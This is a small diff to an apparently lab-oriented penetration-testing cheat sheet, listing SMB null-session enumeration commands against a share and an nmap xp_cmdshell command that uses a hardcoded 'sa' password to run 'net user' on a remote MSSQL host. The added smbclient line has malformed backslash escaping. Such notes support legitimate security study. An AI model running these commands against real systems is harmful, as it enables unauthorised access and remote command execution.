@@ -2,6 +2,7 @@
 smbmap -H 10.11.1.136 -u null -p ""   
 smbmap -H 10.11.1.136 -u null -p "" -R   
 smbclient \\\\10.11.1.136\\'Bob Share' ""    
+smbclient \\\\\\\10.11.1.136\\\\'Bob Share' ""    
 
 #### xp_cmdshell
 nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="net user" 10.11.1.31 
